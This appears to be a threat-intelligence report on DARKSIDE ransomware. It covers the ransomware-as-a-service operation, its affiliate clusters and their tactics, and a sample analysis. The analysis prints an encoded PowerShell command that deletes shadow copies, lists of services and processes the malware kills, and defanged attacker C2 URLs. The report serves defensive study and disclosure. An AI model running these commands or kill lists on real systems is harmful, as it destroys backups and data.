This announcement stated that they lost access to_\n_their infrastructure, including their blog, payment, and CDN servers, and would be closing their service. Decrypters_\n_would also be provided for companies who have not paid, possibly to their affiliates to distribute. The post cited law_\n_enforcement pressure and pressure from the United States for this decision. We have not independently validated_\n_these claims and there is some speculation by other actors that this could be an exit scam._\n\n**Background**\n\nSince initially surfacing in August 2020, the creators of DARKSIDE ransomware and their affiliates have launched a\nglobal crime spree affecting organizations in more than 15 countries and multiple industry verticals. Like many of\ntheir peers, these actors conduct multifaceted extortion where data is both exfiltrated and encrypted in place,\nallowing them to demand payment for unlocking and the non-release of stolen data to exert more pressure on\nvictims.\n\n\n-----\n\nThe origins of these incidents are not monolithic. DARKSIDE ransomware operates as a ransomware as a service\n(RaaS) wherein profit is shared between its owners and partners, or affiliates, who provide access to organizations\nand deploy the ransomware. Mandiant currently tracks multiple threat clusters that have deployed this ransomware,\nwhich is consistent with multiple affiliates using DARKSIDE. These clusters demonstrated varying levels of technical\nsophistication throughout intrusions. While the threat actors commonly relied on commercially available and\nlegitimate tools to facilitate various stages of their operations, at least one of the threat clusters also employed a now\npatched zero-day vulnerability.\n\n[Reporting on DARKSIDE has been available in advance of this blog post to users of Mandiant Advantage Free, a](https://www.fireeye.com/advantage/threat-intelligence)\nno-cost version of our threat intelligence platform.\n\n**Targeting**\n\nMandiant has identified multiple DARKSIDE victims through our incident response engagements and from reports\non the DARKSIDE blog. Most of the victim organizations were based in the United States and span across multiple\nsectors, including financial services, legal, manufacturing, professional services, retail, and technology. The number\nof publicly named victims on the DARKSIDE blog has increased overall since August 2020, with the exception of a\nsignificant dip in the number of victims named during January 2021 (Figure 1). It is plausible that the decline in\nJanuary was due to threat actors using DARKSIDE taking a break during the holiday season. The overall growth in\nthe number of victims demonstrates the increasing use of the DARKSIDE ransomware by multiple affiliates.\n\n\nKnown DARKSIDE victims (August 2020 to April 2021)\n\n\nFigure 1: Known DARKSIDE\n\n\nvictims (August 2020 to April 2021)\n\n**DARKSIDE Ransomware Service**\n\n\n-----\n\nBeginning in November 2020, the Russian speaking actor darksupp advertised DARKSIDE RaaS on the Russian\nlanguage forums exploit.in and xss.is. In April 2021, darksupp posted an update for the \"Darkside 2.0\" RaaS that\nincluded several new features and a description of the types of partners and services they were currently seeking\n(Table 1). Affiliates retain a percentage of the ransom fee from each victim. Based on forum advertisements, the\nRaaS operators take 25% for ransom fees less than $500,000, but this decreases to 10 percent for ransom fees\ngreater than $5 million.\n\nIn addition to providing builds of DARKSIDE ransomware, the operators of this service also maintain a blog\naccessible via TOR. The actors use this site to publicize victims in an attempt to pressure these organizations into\npaying for the non-release of stolen data. A recent update to their underground forum advertisement also indicates\nthat actors may attempt to DDoS victim organizations. The actor darksupp has stated that affiliates are prohibited\nfrom targeting hospitals, schools, universities, non-profit organizations, and public sector entities. This may be an\neffort by the actor(s) to deter law enforcement action, since targeting of these sectors may invite additional scrutiny.\nAffiliates are also prohibited from targeting organizations in Commonwealth of Independent States (CIS) nations.\n\n\n**Advertisement**\n**Date/Version**\n\n\n**Feature/Update** **Related Reporting**\n**(for Mandiant**\n**Advantage**\n**customers)**\n\n\nNov. 10, 2020\n(V1)\nAbility to generate builds for both Windows and Linux environments\nfrom within the administration panel.\n\nEncrypts files using Salsa20 encryption along with an RSA-1024 public\nkey\n\nAccess to an administrative panel via TOR that can be used by clients\nto manage Darkside builds, payments, blog posts, and communication\nwith victims\n\nThe admin panel includes a Blog section that allows clients to publish\nvictim information and announcements to the Darkside website for the\npurposes of shaming victims and coercing them to pay ransom\ndemands\n\nApril 14, 2021\n(V2.0)\nAutomated test decryption.

Within this panel, affiliates can perform various actions such as creating a\nransomware build, specifying content for the DARKSIDE blog, managing victims, and contacting support. Mandiant\nhas identified at least five Russian-speaking actors who may currently, or have previously, been DARKSIDE\naffiliates. Relevant advertisements associated with a portion of these threat actors have been aimed at finding either\ninitial access providers or actors capable of deploying ransomware on accesses already obtained. Some actors\nclaiming to use DARKSIDE have also allegedly partnered with other RaaS affiliate programs, including BABUK and\n[SODINOKIBI (aka REvil). For more information on these threat actors, please see Mandiant Advantage.](https://advantage.mandiant.com/reports/21-00009431)\n\n\nDARKSIDE affiliate panel\n\n\nFigure 2: DARKSIDE\n\naffiliate panel\n\n**Attack Lifecycle**\n\nMandiant currently tracks five clusters of threat activity that have involved the deployment of DARKSIDE. For more\ninformation on uncategorized threats, refer to our post, \"DebUNCing Attribution: How Mandiant Tracks\nUncategorized Threat Actors.\" These clusters may represent different affiliates of the DARKSIDE RaaS platform.\nThroughout observed incidents, the threat actor commonly relied on various publicly available and legitimate tools\nthat are commonly used to facilitate various stages of the attack lifecycle in post-exploitation ransomware attacks\n(Figure 3). Additional details on three of these UNC groups are included below.\n\n\n-----\n\nTTPs seen throughout DARKSIDE ransomware engagements\n\n\nFigure 3: TTPs seen\n\nthroughout DARKSIDE ransomware engagements\n_UNC2628_\n\nUNC2628 has been active since at least February 2021. Their intrusions progress relatively quickly with the threat\nactor typically deploying ransomware in two to three days. We have some evidence that suggests UNC2628 has\npartnered with other RaaS including SODINOKIBI (REvil) and NETWALKER.\n\nIn multiple cases we have observed suspicious authentication attempts against corporate VPN infrastructure\nimmediately prior to the start of interactive intrusion operations. The authentication patterns were consistent\nwith a password spraying attack, though available forensic evidence was insufficient to definitively attribute this\nprecursor activity to UNC2628.\nIn cases where evidence was available, the threat actor appeared to obtain initial access through corporate\nVPN infrastructure using legitimate credentials.\n\n\n-----\n\nUNC2628 has interacted with victim environments using various legitimate accounts, but in multiple cases has\nalso created and used a domain account with the username 'spservice'. Across all known intrusions, UNC2628\nhas made heavy use of the Cobalt Strike framework and BEACON payloads. BEACON command and control\n(C2) infrastructure attributed to this actor has included the following:\n\nhxxps://104.193.252[.]197:443/\nhxxps://162.244.81[.]253:443/\nhxxps://185.180.197[.]86:443/\nhxxps://athaliaoriginals[.]com/\nhxxps://lagrom[.]com:443/font.html\nhxxps://lagrom[.]com:443/night.html\nhxxps://lagrom[.]com:443/online.html\nhxxps://lagrom[.]com:443/send.html\nhxxps://lagrom[.]com/find.html?key=id#In at least some cases there is evidence to suggest this actor has employed Mimikatz for credential theft and\nprivilege escalation.\nThe threat actor appeared to have used built-in commands such as ‘net’ and ‘ping’ to perform basic\nreconnaissance of the internal network, though it is likely that additional reconnaissance was performed via\nBEACON and not represented in available log sources.\nUNC2628 has moved laterally in environments almost exclusively via RDP using legitimate credentials and\nCobalt Strike BEACON payloads. This threat cluster uses both HTTPS BEACON payloads and SMB\nBEACON, the latter almost exclusively using named pipes beginning with “\\\\.\\pipe\\UIA_PIPE_”\nIntrusions attributed to this threat cluster have progressed swiftly from intrusion to data theft and ransomware\ndeployment, and have thus not focused heavily on maintaining a persistent foothold in impacted\nenvironments. Despite this, UNC2628 has maintained access via the collection of legitimate credentials, the\ncreation of attacker-controlled domain accounts (spservice), and via the creation of Windows services intended\nto launch BEACON. Notably, UNC2628 has repeatedly loaded BEACON with a service named ‘CitrixInit’.\n[UNC2628 has also employed F-Secure Labs' Custom Command and Control (C3) framework, deploying](https://github.com/FSecureLABS/C3#:~:text=C3%20(Custom%20Command%20and%20Control,which%20is%20supported%20at%20release.)\nrelays configured to proxy C2 communications through the Slack API. Based on this actor's other TTPs they\nwere likely using C3 to obfuscate Cobalt Strike BEACON traffic.\nThe threat actor has exfiltrated data over SFTP using Rclone to systems in cloud hosting environments.\nRclone is a command line utility to manage files for cloud storage applications. Notably, the infrastructure used\nfor data exfiltration has been reused across multiple intrusions. In one case, the data exfiltration occurred on\nthe same day that the intrusion began.\nUNC2628 deploys DARKSIDE ransomware encryptors using PsExec to a list of hosts contained in multiple\ntext files.\nThe threat actor has used the following directories, placing copies of backdoors, ransomware binaries, copies\nof PsExec, and lists of victim hosts within them.\n\nC:\\run\\\nC:\\home\\\nC:\\tara\\\nC:\\Users\\[username]\\Music\\\nC:\\Users\\Public\n\n_UNC2659_\n\nUNC2659 has been active since at least January 2021. We have observed the threat actor move through the whole\nattack lifecycle in under 10 days. UNC2659 is notable given their use of an exploit in the SonicWall SMA100 SSL\n[VPN product, which has since been patched by SonicWall. The threat actor appeared to download several tools](https://www.sonicwall.com/support/product-notification/additional-sma-100-series-10-x-and-9-x-firmware-updates-required-updated-april-29-2021-12-30-p-m-cst/210122173415410/)\nused for various phases of the attack lifecycle directly from those tools’ legitimate public websites.\n\n\n-----\n\n[The threat actor obtained initial access to their victim by exploiting CVE 2021 20016, an exploit in the](https://intelligence.fireeye.com/reports/21-00008254)\n[SonicWall SMA100 SSL VPN product, which has been patched by SonicWall. There is some evidence to](https://www.sonicwall.com/support/product-notification/additional-sma-100-series-10-x-and-9-x-firmware-updates-required-updated-april-29-2021-12-30-p-m-cst/210122173415410/)\nsuggest the threat actor may have used the vulnerability to disable multi-factor authentication options on the\nSonicWall VPN, although this has not been confirmed.\nThe threat actor leveraged TeamViewer (TeamViewer_Setup.exe) to establish persistence within the victim\nenvironment. Available evidence suggests that the threat actor downloaded TeamViewer directly from the\nfollowing URL and also browsed for locations from which they could download the AnyDesk utility.\n\nhxxps://dl.teamviewer[.]com/download/version_15x/TeamViewer_Setup.exe\nThe threat actor appeared to download the file rclone.exe directly from rclone[.]org hxxps://downloads.rclone[.]org/v1.54.0/rclone-v1.54.0-windows-amd64.zip. The threat actors were seen using\nrclone to exfiltrate hundreds of gigabytes of data over the SMB protocol to the pCloud cloud-based hosting and\nstorage service.\nThe threat actor deployed the file power_encryptor.exe in a victim environment, encrypting files and creating\nransom notes over the SMB protocol.\nMandiant observed the threat actor navigate to ESXi administration interfaces and disable snapshot features\nprior to the ransomware encryptor deployment, which affected several VM images.\n\n_UNC2465_\n\nUNC2465 activity dates back to at least April 2019 and is characterized by their use of similar TTPs to distribute the\nPowerShell-based .NET backdoor SMOKEDHAM in victim environments. In one case where DARKSIDE was\ndeployed, there were months-long gaps, with only intermittent activity between the time of initial compromise to\nransomware deployment. In some cases, this could indicate that initial access was provided by a separate actor.\n\nUNC2465 used phishing emails and legitimate services to deliver the SMOKEDHAM backdoor. SMOKEDHAM\nis a .NET backdoor that supports keylogging, taking screenshots, and executing arbitrary .NET commands.\nDuring one incident, the threat actor appeared to establish a line of communication with the victim before\nsending a malicious Google Drive link delivering an archive containing an LNK downloader. More recent\nUNC2465 emails have used Dropbox links with a ZIP archive containing malicious LNK files that, when\nexecuted, would ultimately lead to SMOKEDHAM being downloaded onto the system.\nUNC2465 has used Advanced IP Scanner, BLOODHOUND, and RDP for internal reconnaissance and lateral\nmovement activities within victim environments.\nThe threat actor has used Mimikatz for credential harvesting to escalate privileges in the victim network.\nUNC2465 also uses the publicly available NGROK utility to bypass firewalls and expose remote desktop\nservice ports, like RDP and WinRM, to the open internet.\nMandiant has observed the threat actor using PsExec and cron jobs to deploy the DARKSIDE ransomware.\nUNC2465 has called the customer support lines of victims and told them that data was stolen and instructed\nthem to follow the link in the ransom note.\n\n**Implications**\n\nWe believe that threat actors have become more proficient at conducting multifaceted extortion operations and that\nthis success has directly contributed to the rapid increase in the number of high-impact ransomware incidents over\nthe past few years. Ransomware operators have incorporated additional extortion tactics designed to increase the\nlikelihood that victims will acquiesce to paying the ransom prices. As one example, in late April 2021, the DARKSIDE\noperators released a press release stating that they were targeting organizations listed on the NASDAQ and other\nstock markets. They indicated that they would be willing to give stock traders information about upcoming leaks in\norder to allow them potential profits due to stock price drops after an announced breach. In another notable\nexample, an attacker was able to obtain the victim's cyber insurance policy and leveraged this information during the\nransom negotiation process refusing to lower the ransom amount given their knowledge of the policy limits. This\nreinforces that during the post-exploitation phase of ransomware incidents, threat actors can engage in internal\nreconnaissance and obtain data to increase their negotiating power. We expect that the extortion tactics that threat\nactors use to pressure victims will continue to evolve throughout 2021.\n\n\n-----\n\nBased on the evidence that DARKSIDE ransomware is distributed by multiple actors, we anticipate that the TTPs\nused throughout incidents associated with this ransomware will continue to vary somewhat.

This larger group has set the foundation\nfor all of our work, but a smaller group of people contributed more directly to producing this report and we would like\nto thank them by name. We would like to specifically thank Bryce Abdo and Matthew Dunwoody from our Advanced\nPractices team and Jay Smith from FLARE, all of whom provided analytical support and technical review.

DARKSIDE RaaS affiliates are given access to an administration panel on which they create\nbuilds for specific victims. The panel allows some degree of customization for each ransomware build such as\nchoosing the encryption mode and whether local disks and network shares should be encrypted (Figures 4). The\nfollowing malware analysis is based on the file MD5: 1a700f845849e573ab3148daef1a3b0b. A more recently\nanalyzed DARKSIDE sample had the following notable differences:\n\nThe option for beaconing to a C2 server was disabled and the configuration entry that would have contained a\nC2 server was removed.\nIncluded a persistence mechanism in which the malware creates and launches itself as a service.\nContained a set of hard-coded victim credentials that were used to attempt to logon as a local user. If the user\ntoken retrieved based on the stolen credentials is an admin token and is part of the domain administrators'\ngroup, it is used for network enumeration and file permission access.\n\n\n-----\n\nDARKSIDE build configuration options appearing in the administration panel\n\n\nFigure 4: DARKSIDE build\n\nconfiguration options appearing in the administration panel\nHost-Based Indicators\n\n_Persistence Mechanism_\n\nEarly versions of the malware did not contain a persistence mechanism. An external tool or installer was required if\nthe attacker desired persistence. A DARKSIDE version observed in May 2021 implement a persistence mechanism\nthrough which the malware creates and launches itself as a service with a service name and description named\nusing eight pseudo-randomly defined lowercase hexadecimal characters (e.g., \".e98fc8f7\") that are also appended\nby the malware to various other artifacts it created. This string of characters is referenced as <ransom_ext>. :\n\nService Name: <ransom_ext>\nDescription: <ransom_ext>\n\nFilesystem Artifacts\n\n_Created Files_\n\n%CD%\\LOG<ransom_ext>.TXT\nREADME<ransom_ext>.TXT\n<original_filename_plus_ext><ransom_ext>\nMay version: %PROGRAMDATA%\\<ransom_ext>.ico\n\n_Registry Artifacts_\n\nThe DARKSIDE version observed in May sets the following registry key:\n\nHKCR\\<ransom_ext>\\DefaultIcon\\<ransom_ext>\\DefaultIcon=%PROGRAMDATA%\\<ransom_ext>.ico\n\n\n-----\n\n_Configuration_\n\nThe malware initializes a 0x100-byte keystream used to decrypt strings and configuration data. Strings are\ndecrypted as needed and overwritten with NULL bytes after use. The malware's configuration size is 0xBE9 bytes. A\nportion of the decrypted configuration is shown in Figure 5.\n\n00000000 01 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n00000010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n00000020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n00000030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n00000040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n00000060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n00000070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n00000080 95 AA A8 7C 2B 6A D5 12 0E 73 B3 7D BD 16 25 62 •ª¨|+jÕ..s³}½.%b\n00000090 A4 A8 BF 19 73 F7 E0 BC DF 02 A8 94 32 CF 0C C0 ¤¨¿.s÷à¼ß.¨\"2Ï.À\n000000A0 C5 83 0F 14 66 02 87 EE FD 29 96 DF 02 05 C1 12 Åƒ..f.‡îý)–ß..Á.\n000000B0 3E 43 A7 59 E1 F0 C4 5D AE E1 20 2E 77 D9 CA 3C >C§YáðÄ]®á .wÙÊ<\n000000C0 AD C6 BC 84 75 1C E7 0B F0 30 2A 51 13 7A B2 66 .Æ¼„u.ç.ð0*Q.z²f\n000000D0 44 73 79 E1 E4 69 C3 CA 1B C1 76 63 65 95 EA CA DsyáäiÃÊ.Ávce•êÊ\n000000E0 F6 10 68 0D CE 36 61 F9 57 B9 19 50 31 D4 E1 70 ö.h.Î6aùW¹.P1Ôáp\n000000F0 EC 7B 33 1E 4F 17 E1 80 1D BC CF 8C D8 C5 66 41 ì{3.O.á€.¼ÏŒØÅfA\n00000100 E5 0A 00 00 02 6E 01 02 15 03 43 01 8E 24 0E 72 å....n....C.Ž$.r\n<cut>\n\nFigure 5: Partial decrypted configuration\n\nThe sample's 0x80-byte RSA public key blob begins at offset 0x80.

In a DARKSIDE\nversion observed in May 2021, the file extension is generated using a MachineGuid registry value as a seed rather\nthan the MAC address. The file extension consists of eight lowercase hexadecimal characters (e.g., \".e98fc8f7\") and\n[is referred to as <ransom_ext>. The file extension generation algorithm has been recreated in Python. If logging is](https://gist.github.com/Demonslay335/f82b8d9f94040b875ceb2386f9533362)\nenabled, the malware creates the log file LOG<ransom_ext>.TXT in its current directory.\n\nThe malware supports the command line argument \"-path,\" which allows an attacker to specify a directory to target\nfor encryption.\n\nThe sample analyzed for this report is not configured to perform a system language check. If this functionality were\nenabled and the check succeeded, the string \"This is a Russian-Speaking System, Exit\" would be written to the log\nfile and the malware would exit.\n\n_Anti-Recovery Techniques_\n\nThe malware locates and empties Recycle Bins on the system. If the process is running under WOW64, it executes\nthe PowerShell command in Figure 8 using CreateProcess to delete volume shadow copies.\n\npowershell -ep bypass -c \"(0..61)|%{$s+=[char][byte]\n('0x'+'4765742D576D694F626A6563742057696E33325F536861646F7763\n6F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex\n$s\"\n\nFigure 8: Encoded PowerShell command\n\nThe decoded command from Figure 4 is \"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}.\" If\nthe malware is not running under WOW64, it uses COM objects and WMI commands to delete volume shadow\ncopies. The decrypted strings in Figure 9 are used to facilitate this process.\n\nroot/cimv2\nSELECT * FROM Win32_ShadowCopy\nWin32_ShadowCopy.ID='%s'\n\nFigure 9: Decrypted strings related to shadow copy deletion\n\n_System Manipulation_\n\n\n-----\n\nAny service the name of which contains one of the strings listed in Figure 10 is stopped and deleted.\n\nvss\nsql\nsvc$\nmemtas\nmepocs\nsophos\nveeam\nbackup\n\nFigure 10: Service-related strings\n\nThe version observed in May 2021 is additionally configured to stop and delete services containing the strings listed\nin Figure 11.\n\nGxVss\nGxBlr\nGxFWD\nGxCVD\nGxCIMgr\n\nFigure 11: Additional service-related strings in May version\n\nAny process name containing one of the strings listed in Figure 12 is terminated.\n\nsql\noracle\nocssd\ndbsnmp\nsynctime\nagntsvc\nisqlplussvc\nxfssvccon\nmydesktopservice\nocautoupds\nencsvc\nfirefox\ntbirdconfig\nmydesktopqos\nocomm\ndbeng50\nsqbcoreservice\nexcel\ninfopath\nmsaccess\nmspub\nonenote\noutlook\npowerpnt\nsteam\nthebat\nthunderbird\nvisio\nwinword\nwordpad\nnotepad\n\n\n-----\n\nFigure 12: Process related strings\n\n_File Encryption_\n\nBased on its configuration, the malware targets fixed and removable disks as well as network shares.
